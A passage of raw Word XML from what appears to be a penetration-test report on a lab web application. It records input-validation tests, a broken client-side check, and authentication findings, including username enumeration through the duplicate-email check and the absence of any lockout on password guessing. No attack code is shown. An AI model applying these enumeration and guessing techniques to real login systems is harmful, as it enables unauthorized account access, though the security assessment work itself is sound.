      <w:r w:rsidR="001C5A43">
        <w:t xml:space="preserve"> had a JavaScript file </w:t>
      </w:r>
      <w:r w:rsidR="001C5A43" w:rsidRPr="00EB5A9E">
        <w:t>attached</w:t>
      </w:r>
      <w:r w:rsidR="00C3556C">
        <w:t xml:space="preserve"> (Appendix </w:t>
      </w:r>
      <w:r w:rsidR="001D0209">
        <w:t>2.1</w:t>
      </w:r>
      <w:r w:rsidR="00C3556C">
        <w:t>)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="001C5A43">
        <w:t xml:space="preserve">that was designed to implement </w:t>
      </w:r>
      <w:r w:rsidR="00017880">
        <w:t>client-side</w:t>
      </w:r>
      <w:r w:rsidR="001C5A43">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>controls</w:t>
      </w:r>
      <w:r w:rsidR="001C5A43">
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:r w:rsidR="00325748">
        <w:t xml:space="preserve">To determine if the JavaScript file was working, it was analyzed, and a selection of submissions were constructed to trigger the validation. However, when all failed to trigger, it was determined to be faulty. </w:t>
      </w:r>
      <w:r w:rsidR="001C5A43">
        <w:t xml:space="preserve">This </w:t>
      </w:r>
      <w:r w:rsidR="00325748">
        <w:t>allows</w:t>
      </w:r>
      <w:r w:rsidR="001C5A43">
        <w:t xml:space="preserve"> the </w:t>
      </w:r>
      <w:r w:rsidR="00003818">
        <w:t>u</w:t>
      </w:r>
      <w:r w:rsidR="001C5A43">
        <w:t>ser to submit anything to the server.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72AFE0C8" w14:textId="77777777" w:rsidR="00EE6186" w:rsidRDefault="00B543BE" w:rsidP="00DA77FF">
      <w:pPr>
        <w:ind w:left="708"/>
      </w:pPr>
      <w:r>
        <w:t>The following were the submissions sent to test the input validation on all the text input fields:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="TableGrid"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblInd w:w="817" w:type="dxa"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="1888"/>
        <w:gridCol w:w="6645"/>
      </w:tblGrid>
      <w:tr w:rsidR="000375DF" w14:paraId="3C9DFC35" w14:textId="77777777" w:rsidTr="000B7509">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2114" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="274221" w:themeFill="accent4" w:themeFillShade="80"/>
          </w:tcPr>
          <w:p w14:paraId="604F52CA" w14:textId="77777777" w:rsidR="000375DF" w:rsidRDefault="000375DF" w:rsidP="00DA77FF">
            <w:r>
              <w:t>Test Type</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6645" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="274221" w:themeFill="accent4" w:themeFillShade="80"/>
          </w:tcPr>
          <w:p w14:paraId="5E27EC38" w14:textId="77777777" w:rsidR="000375DF" w:rsidRDefault="000375DF" w:rsidP="00DA77FF">
            <w:r>
              <w:t>Test Contents</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="000375DF" w14:paraId="254D2F09" w14:textId="77777777" w:rsidTr="000B7509">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2114" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="13E14B42" w14:textId="77777777" w:rsidR="000375DF" w:rsidRDefault="000375DF" w:rsidP="00DA77FF">
            <w:r>
              <w:t>Length Long</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6645" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="4510D9D3" w14:textId="77777777" w:rsidR="00FB7508" w:rsidRDefault="00FB7508" w:rsidP="00DA77FF">
            <w:r>
              <w:t>a</w:t>
            </w:r>
            <w:r w:rsidRPr="00FB7508">
              <w:t>aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="32814BFE" w14:textId="77777777" w:rsidR="000375DF" w:rsidRDefault="00FB7508" w:rsidP="00DA77FF">
            <w:r w:rsidRPr="00FB7508">
              <w:t>aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="000375DF" w14:paraId="1C417130" w14:textId="77777777" w:rsidTr="000B7509">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2114" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="1D1224FE" w14:textId="77777777" w:rsidR="000375DF" w:rsidRDefault="000375DF" w:rsidP="00DA77FF">
            <w:r>
              <w:t>Length Short</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6645" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="5C21EB01" w14:textId="77777777" w:rsidR="000375DF" w:rsidRDefault="0038049A" w:rsidP="00DA77FF">
            <w:r>
              <w:t>a</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="000375DF" w14:paraId="753BE847" w14:textId="77777777" w:rsidTr="000B7509">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2114" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="15A00087" w14:textId="77777777" w:rsidR="000375DF" w:rsidRDefault="00377695" w:rsidP="00DA77FF">
            <w:r>
              <w:t>Empty</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6645" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="3640F676" w14:textId="77777777" w:rsidR="000375DF" w:rsidRDefault="000375DF" w:rsidP="00DA77FF"/>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="164ADCB6" w14:textId="77777777" w:rsidR="00DA2DCA" w:rsidRDefault="00DA2DCA" w:rsidP="002B6D7F">
      <w:pPr>
        <w:ind w:left="708"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="510201C4" w14:textId="77777777" w:rsidR="002B6D7F" w:rsidRDefault="00B74543" w:rsidP="002B6D7F">
      <w:pPr>
        <w:ind w:left="708"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">When </w:t>
      </w:r>
      <w:r w:rsidR="002B6D7F">
        <w:t xml:space="preserve">it was determined that the client-side validation was not being performed. </w:t>
      </w:r>
      <w:r w:rsidR="00CD2830">
        <w:t>Further testing was implemented</w:t>
      </w:r>
      <w:r w:rsidR="002B6D7F">
        <w:t xml:space="preserve"> to analyses the </w:t>
      </w:r>
      <w:r w:rsidR="006B403F">
        <w:t>server-side</w:t>
      </w:r>
      <w:r w:rsidR="002B6D7F">
        <w:t xml:space="preserve"> validation. This means that different negative responses would be expected and accounted for.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="550A9943" w14:textId="77777777" w:rsidR="002B6D7F" w:rsidRDefault="002B6D7F" w:rsidP="002B6D7F">
      <w:pPr>
        <w:ind w:left="708"/>
      </w:pPr>
      <w:r>
        <w:t>The following were the submissions sent to test the input validation on all the text input fields</w:t>
      </w:r>
      <w:r w:rsidR="00B74543">
        <w:t xml:space="preserve"> on pages</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12A6901C" w14:textId="77777777" w:rsidR="00B74543" w:rsidRDefault="00B74543" w:rsidP="00AC5E74">
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
        <w:ind w:left="708"/>
      </w:pPr>
      <w:r w:rsidRPr="00B74543">
        <w:t>http://192.168.1.20/index.php</w:t>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
    </w:p>
    <w:p w14:paraId="1AF343D0" w14:textId="77777777" w:rsidR="00B74543" w:rsidRDefault="00B74543" w:rsidP="00AC5E74">
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
        <w:ind w:left="708"/>
      </w:pPr>
      <w:r w:rsidRPr="00B74543">
        <w:t>http://192.168.1.20/member-profile.php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="017D3A8A" w14:textId="77777777" w:rsidR="00B74543" w:rsidRPr="000B7509" w:rsidRDefault="00B74543" w:rsidP="00DA2DCA">
      <w:pPr>
        <w:ind w:firstLine="708"/>
      </w:pPr>
      <w:r w:rsidRPr="00B74543">
        <w:t>http://192.168.1.20/ratings.php</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="TableGrid"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblInd w:w="817" w:type="dxa"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="1888"/>
        <w:gridCol w:w="6645"/>
      </w:tblGrid>
      <w:tr w:rsidR="002B6D7F" w14:paraId="77F7F16C" w14:textId="77777777" w:rsidTr="006A00E9">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2114" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="274221" w:themeFill="accent4" w:themeFillShade="80"/>
          </w:tcPr>
          <w:p w14:paraId="3C3B678C" w14:textId="77777777" w:rsidR="002B6D7F" w:rsidRDefault="002B6D7F" w:rsidP="006A00E9">
            <w:r>
              <w:t>Test Type</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6645" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="274221" w:themeFill="accent4" w:themeFillShade="80"/>
          </w:tcPr>
          <w:p w14:paraId="4E002E2A" w14:textId="77777777" w:rsidR="002B6D7F" w:rsidRDefault="002B6D7F" w:rsidP="006A00E9">
            <w:r>
              <w:t>Test Contents</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="002B6D7F" w14:paraId="49B2D0F0" w14:textId="77777777" w:rsidTr="006A00E9">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2114" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="7DF5B936" w14:textId="77777777" w:rsidR="002B6D7F" w:rsidRDefault="002B6D7F" w:rsidP="006A00E9">
            <w:r>
              <w:t>Length Long</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6645" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="56CF4BEB" w14:textId="77777777" w:rsidR="002B6D7F" w:rsidRDefault="002B6D7F" w:rsidP="006A00E9">
            <w:r>
              <w:t>a</w:t>
            </w:r>
            <w:r w:rsidRPr="00FB7508">
              <w:t>aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="69A06796" w14:textId="77777777" w:rsidR="002B6D7F" w:rsidRDefault="002B6D7F" w:rsidP="006A00E9">
            <w:r w:rsidRPr="00FB7508">
              <w:t>aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="002B6D7F" w14:paraId="2241FFEA" w14:textId="77777777" w:rsidTr="006A00E9">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2114" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="6C067328" w14:textId="77777777" w:rsidR="002B6D7F" w:rsidRDefault="002B6D7F" w:rsidP="006A00E9">
            <w:r>
              <w:t>Length Short</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6645" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="4E7CBBEB" w14:textId="77777777" w:rsidR="002B6D7F" w:rsidRDefault="002B6D7F" w:rsidP="006A00E9">
            <w:r>
              <w:t>a</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="002B6D7F" w14:paraId="38F22BD8" w14:textId="77777777" w:rsidTr="006A00E9">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2114" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="590369CE" w14:textId="77777777" w:rsidR="002B6D7F" w:rsidRDefault="002B6D7F" w:rsidP="006A00E9">
            <w:r>
              <w:t>Numbers</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6645" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="72FEEDB5" w14:textId="77777777" w:rsidR="002B6D7F" w:rsidRDefault="002B6D7F" w:rsidP="006A00E9">
            <w:r>
              <w:t>11111</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="002B6D7F" w14:paraId="5C2BECE6" w14:textId="77777777" w:rsidTr="006A00E9">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2114" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="3D88D74F" w14:textId="77777777" w:rsidR="002B6D7F" w:rsidRDefault="002B6D7F" w:rsidP="006A00E9">
            <w:r>
              <w:t>Symbols</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6645" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="45B8C35F" w14:textId="77777777" w:rsidR="002B6D7F" w:rsidRDefault="002B6D7F" w:rsidP="006A00E9">
            <w:r>
              <w:t>1/\%*@#!”</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="002B6D7F" w14:paraId="39DB4D24" w14:textId="77777777" w:rsidTr="006A00E9">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2114" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="1C2C2825" w14:textId="77777777" w:rsidR="002B6D7F" w:rsidRDefault="00CD2830" w:rsidP="006A00E9">
            <w:r>
              <w:t>Not Null</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6645" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="650CDF31" w14:textId="77777777" w:rsidR="002B6D7F" w:rsidRDefault="002B6D7F" w:rsidP="006A00E9"/>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00CD2830" w14:paraId="023BD51D" w14:textId="77777777" w:rsidTr="006A00E9">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2114" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="2D2B3EF6" w14:textId="77777777" w:rsidR="00CD2830" w:rsidRDefault="00CD2830" w:rsidP="006A00E9">
            <w:r>
              <w:t>Unique</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6645" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="6F1B37E2" w14:textId="77777777" w:rsidR="00CD2830" w:rsidRPr="0069052B" w:rsidRDefault="0069052B" w:rsidP="006A00E9">
            <w:pPr>
              <w:rPr>
                <w:i/>
                <w:iCs/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="0069052B">
              <w:rPr>
                <w:i/>
                <w:iCs/>
              </w:rPr>
              <w:t>Submit a valid result twice</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="4C6B5E53" w14:textId="77777777" w:rsidR="002B6D7F" w:rsidRDefault="002B6D7F" w:rsidP="002B6D7F">
      <w:pPr>
        <w:ind w:left="708"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">When these submissions were made it was determined that the only validation was set up on the email field with the unique flag </w:t>
      </w:r>
      <w:r w:rsidR="00CD2830">
        <w:t xml:space="preserve">was </w:t>
      </w:r>
      <w:r>
        <w:t>set up so that the email can be used as the username of the user.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E0E771D" w14:textId="77777777" w:rsidR="00EE1635" w:rsidRDefault="00DA0E52" w:rsidP="00C64963">
      <w:pPr>
        <w:ind w:left="708"/>
      </w:pPr>
      <w:r>
        <w:t>When searching through the web application a search was carried out for any</w:t>
      </w:r>
      <w:r w:rsidR="00EE1635">
        <w:t xml:space="preserve"> disabled elements</w:t>
      </w:r>
      <w:r>
        <w:t>. However, none were</w:t>
      </w:r>
      <w:r w:rsidR="001C5A43">
        <w:t xml:space="preserve"> detected on the site.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1BFC5FAA" w14:textId="77777777" w:rsidR="002A1D22" w:rsidRDefault="002A1D22">
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="3BEEC537" w14:textId="77777777" w:rsidR="007E4070" w:rsidRDefault="002A1D22" w:rsidP="007E4070">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:bookmarkStart w:id="23" w:name="_Toc58836576"/>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>B</w:t>
      </w:r>
      <w:r w:rsidR="007E4070">
        <w:t>rowser Extensions</w:t>
      </w:r>
      <w:bookmarkEnd w:id="23"/>
    </w:p>
    <w:p w14:paraId="52109B42" w14:textId="77777777" w:rsidR="00AC2E0D" w:rsidRPr="00AC2E0D" w:rsidRDefault="00AC2E0D" w:rsidP="00F40A2C">
      <w:pPr>
        <w:ind w:left="708"/>
      </w:pPr>
      <w:r>
        <w:t>No .jar files where found suggesting that there are no Java applications being run on this web application.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6221095E" w14:textId="77777777" w:rsidR="007E4070" w:rsidRDefault="007E4070" w:rsidP="00F40A2C">
      <w:pPr>
        <w:ind w:left="708"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">While a folder was found with information pertaining to a flash function. </w:t>
      </w:r>
      <w:r w:rsidR="00D06DD4">
        <w:t>However,</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> it did not seem to be being used.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2871458C" w14:textId="77777777" w:rsidR="00AC2E0D" w:rsidRDefault="00AC2E0D" w:rsidP="00F40A2C">
      <w:pPr>
        <w:ind w:left="578" w:firstLine="130"/>
      </w:pPr>
      <w:r>
        <w:t>No .xap files where found suggesting that no Silverlight applications are being run.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C85E301" w14:textId="77777777" w:rsidR="00BF3571" w:rsidRPr="007E4070" w:rsidRDefault="00BF3571" w:rsidP="00F40A2C">
      <w:pPr>
        <w:ind w:left="578" w:firstLine="130"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="57625A5B" w14:textId="77777777" w:rsidR="00257FFB" w:rsidRDefault="00257FFB" w:rsidP="00CD4824">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:bookmarkStart w:id="24" w:name="_Toc58836577"/>
      <w:r>
        <w:t>Procedure: Test Authentication</w:t>
      </w:r>
      <w:bookmarkEnd w:id="24"/>
    </w:p>
    <w:p w14:paraId="7331295A" w14:textId="77777777" w:rsidR="00DC5AAE" w:rsidRDefault="00A96FF0" w:rsidP="00DC5AAE">
      <w:r>
        <w:t xml:space="preserve">A secure Authentication mechanism is vital to achieving a secure system. Being able to circumvent these mechanisms is a classic way of gaining unauthorized access to a web application. In order to test this a number of components needed to be </w:t>
      </w:r>
      <w:r w:rsidR="003F330D">
        <w:t>scrutinised</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. This mainly took place on the index.php page and involved looking at all the aspects contained on that page, as well as how the data it handled was transmitted. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="400C48CC" w14:textId="77777777" w:rsidR="00BF3571" w:rsidRPr="00DC5AAE" w:rsidRDefault="00BF3571" w:rsidP="00DC5AAE"/>
    <w:p w14:paraId="3251918D" w14:textId="77777777" w:rsidR="002D6A2E" w:rsidRDefault="002D6A2E" w:rsidP="002D6A2E">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:bookmarkStart w:id="25" w:name="_Toc58836578"/>
      <w:r>
        <w:t>Understand the Mechanism</w:t>
      </w:r>
      <w:bookmarkEnd w:id="25"/>
    </w:p>
    <w:p w14:paraId="7E49A716" w14:textId="77777777" w:rsidR="002D6A2E" w:rsidRDefault="00DC5B92" w:rsidP="002D6A2E">
      <w:pPr>
        <w:ind w:left="708"/>
      </w:pPr>
      <w:r>
        <w:t>The authentication is carried out using a login form</w:t>
      </w:r>
      <w:r w:rsidR="0006390F">
        <w:t xml:space="preserve"> that then requests a valid PHPSESSID to identify the user. This is carried out</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> on the main index.php page</w:t>
      </w:r>
      <w:r w:rsidR="0006390F">
        <w:t xml:space="preserve"> a</w:t>
      </w:r>
      <w:r>
        <w:t>s well as an admin login on the admin/login-form.php.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A9BE12A" w14:textId="77777777" w:rsidR="00BF3571" w:rsidRPr="002D6A2E" w:rsidRDefault="00BF3571" w:rsidP="002D6A2E">
      <w:pPr>
        <w:ind w:left="708"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7919F0EE" w14:textId="77777777" w:rsidR="00337ED3" w:rsidRPr="00337ED3" w:rsidRDefault="00D16FE8" w:rsidP="00337ED3">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:bookmarkStart w:id="26" w:name="_Toc58836579"/>
      <w:r>
        <w:t>Data attacks</w:t>
      </w:r>
      <w:bookmarkEnd w:id="26"/>
    </w:p>
    <w:p w14:paraId="733CD125" w14:textId="77777777" w:rsidR="00D16FE8" w:rsidRDefault="001C5A43" w:rsidP="00DA77FF">
      <w:pPr>
        <w:ind w:left="708"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The information gathered in the previous section showed that there were no </w:t>
      </w:r>
      <w:r w:rsidR="00E806CB">
        <w:t xml:space="preserve">effective restrictions </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">placed on the passwords entered by users. This meant that there were </w:t>
      </w:r>
      <w:r w:rsidR="00106B2C">
        <w:t>no</w:t>
      </w:r>
      <w:r w:rsidR="00E806CB">
        <w:t xml:space="preserve"> minimum requirements </w:t>
      </w:r>
      <w:r w:rsidR="00106B2C">
        <w:t>so the password field could be left blank.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F306DDA" w14:textId="40622EB4" w:rsidR="00E806CB" w:rsidRDefault="00A8625B" w:rsidP="00DA77FF">
      <w:pPr>
        <w:ind w:left="708"/>
      </w:pPr>
      <w:r>
        <w:t>As was discovered in section 3.2, t</w:t>
      </w:r>
      <w:r w:rsidR="00E806CB">
        <w:t xml:space="preserve">he website prevents the input of duplicate </w:t>
      </w:r>
      <w:r w:rsidR="00106B2C">
        <w:t xml:space="preserve">emails so that they can be used as </w:t>
      </w:r>
      <w:r w:rsidR="0078345C">
        <w:t>usernames</w:t>
      </w:r>
      <w:r w:rsidR="00D24B6B">
        <w:t>,</w:t>
      </w:r>
      <w:r w:rsidR="0078345C">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00D24B6B">
        <w:t xml:space="preserve">allowing </w:t>
      </w:r>
      <w:r w:rsidR="0078345C">
        <w:t>for</w:t>
      </w:r>
      <w:r w:rsidR="00106B2C">
        <w:t xml:space="preserve"> the exploitation of this </w:t>
      </w:r>
      <w:r w:rsidR="00FA549C">
        <w:t>to enumerate</w:t>
      </w:r>
      <w:r w:rsidR="00106B2C">
        <w:t xml:space="preserve"> possible usernames. </w:t>
      </w:r>
      <w:r w:rsidR="00106B2C" w:rsidRPr="00CC7382">
        <w:t>A python script</w:t>
      </w:r>
      <w:r w:rsidR="00CC7382">
        <w:t xml:space="preserve"> (Appendix </w:t>
      </w:r>
      <w:r w:rsidR="001D0209">
        <w:t>4.1</w:t>
      </w:r>
      <w:r w:rsidR="00CC7382">
        <w:t>)</w:t>
      </w:r>
      <w:r w:rsidR="00106B2C">
        <w:t xml:space="preserve"> was created to check a list of possible usernames</w:t>
      </w:r>
      <w:r w:rsidR="00CC7382">
        <w:t xml:space="preserve"> (Appendix</w:t>
      </w:r>
      <w:r w:rsidR="001D0209">
        <w:t xml:space="preserve"> 4.2</w:t>
      </w:r>
      <w:r w:rsidR="00CC7382">
        <w:t>)</w:t>
      </w:r>
      <w:r w:rsidR="00106B2C">
        <w:t xml:space="preserve"> and ascertain if they existed within the database.</w:t>
      </w:r>
      <w:r w:rsidR="006B403F">
        <w:t xml:space="preserve"> While this </w:t>
      </w:r>
      <w:r w:rsidR="0041785B">
        <w:t xml:space="preserve">did not return any positive results, the test name of </w:t>
      </w:r>
      <w:r w:rsidR="0041785B" w:rsidRPr="0041785B">
        <w:rPr>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t>hacklab@hacklab.com</w:t>
      </w:r>
      <w:r w:rsidR="0041785B">
        <w:t xml:space="preserve"> did return positive meaning that the process does work.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FF3364F" w14:textId="77777777" w:rsidR="0078345C" w:rsidRDefault="00106B2C" w:rsidP="00DA77FF">
      <w:pPr>
        <w:ind w:left="708"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">When the password was guessed for an account </w:t>
      </w:r>
      <w:r w:rsidR="009B7349">
        <w:t>1</w:t>
      </w:r>
      <w:r>
        <w:t>0 times t</w:t>
      </w:r>
      <w:r w:rsidR="0078345C">
        <w:t xml:space="preserve">here </w:t>
      </w:r>
      <w:r>
        <w:t>was</w:t>
      </w:r>
      <w:r w:rsidR="0078345C">
        <w:t xml:space="preserve"> no prevention methods</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> deployed. This highly suggest that there are no limits to the number of guesses possible for an attacker to attempt on any username.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3077671E" w14:textId="77777777" w:rsidR="00BF3571" w:rsidRDefault="00BF3571" w:rsidP="00DA77FF">
      <w:pPr>
        <w:ind w:left="708"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6FBBAB75" w14:textId="77777777" w:rsidR="00337ED3" w:rsidRDefault="0018377B" w:rsidP="0018377B">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:bookmarkStart w:id="27" w:name="_Toc58836580"/>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Special Functions</w:t>
      </w:r>
      <w:bookmarkEnd w:id="27"/>
    </w:p>
    <w:p w14:paraId="0DADA53D" w14:textId="77777777" w:rsidR="0018377B" w:rsidRDefault="001F4B19" w:rsidP="001F4B19">
      <w:pPr>
        <w:ind w:left="708"/>
      </w:pPr>
      <w:r>
        <w:t>There is an a</w:t>
      </w:r>
      <w:r w:rsidR="0018377B">
        <w:t>ccount recovery</w:t>
      </w:r>
      <w:r>
